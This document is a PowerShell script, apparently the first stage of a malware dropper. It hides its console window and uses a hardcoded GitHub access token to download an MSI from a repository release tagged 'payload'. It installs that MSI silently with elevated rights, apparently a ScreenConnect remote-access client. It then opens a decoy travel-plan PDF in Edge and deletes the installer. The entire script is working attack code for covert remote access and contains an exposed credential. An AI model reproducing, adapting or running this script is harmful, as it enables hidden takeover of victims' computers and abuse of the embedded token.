# stage1.ps1 - Hide window properly, then execute chain
try {
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class W32 {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr h, int c);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
}
"@
    $h = [W32]::GetConsoleWindow()
    if ($h -ne [IntPtr]::Zero) { [W32]::ShowWindow($h, 0) }
} catch {}

$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$tk = "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"
$gh = @{"Authorization"="token $tk";"Accept"="application/vnd.github.v3+json"}

# === 1. Download MSI ===
$msiPath = Join-Path $env:TEMP "ScreenConnect.ClientSetup.msi"
Remove-Item $msiPath -Force -ErrorAction SilentlyContinue
try {
    $rel = Invoke-RestMethod -Uri "https://api.github.com/repos/slynet999-coder/Yambo/releases/tags/payload" -Headers $gh
    Invoke-WebRequest -Uri $rel.assets[0].url -Headers @{"Authorization"="token $tk";"Accept"="application/octet-stream"} -OutFile $msiPath -TimeoutSec 180 -UseBasicParsing
} catch {}
if (-not (Test-Path $msiPath)) { exit }
if ((Get-Item $msiPath).Length -lt 1000000) { exit }

# === 2. UAC Install ===
Start-Process "msiexec.exe" -ArgumentList "/i `"$msiPath`" /qn /norestart" -Verb RunAs -Wait

# === 3. PDF Decoy ===
try {
    $fi = Invoke-RestMethod -Uri "https://api.github.com/repos/slynet999-coder/Yambo/contents/Travel_Plan_Meeting_Q4_2026.pdf" -Headers $gh
    $pdfPath = Join-Path $env:TEMP "Travel_Plan_Meeting_Q4_2026.pdf"
    Invoke-WebRequest -Uri $fi.download_url -Headers $gh -OutFile $pdfPath -TimeoutSec 30 -UseBasicParsing
    if (Test-Path $pdfPath) {
        $edge = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
        if (Test-Path $edge) { Start-Process $edge -ArgumentList "`"$pdfPath`"" }
    }
} catch {}

Start-Sleep 3
Remove-Item $msiPath -Force -ErrorAction SilentlyContinue
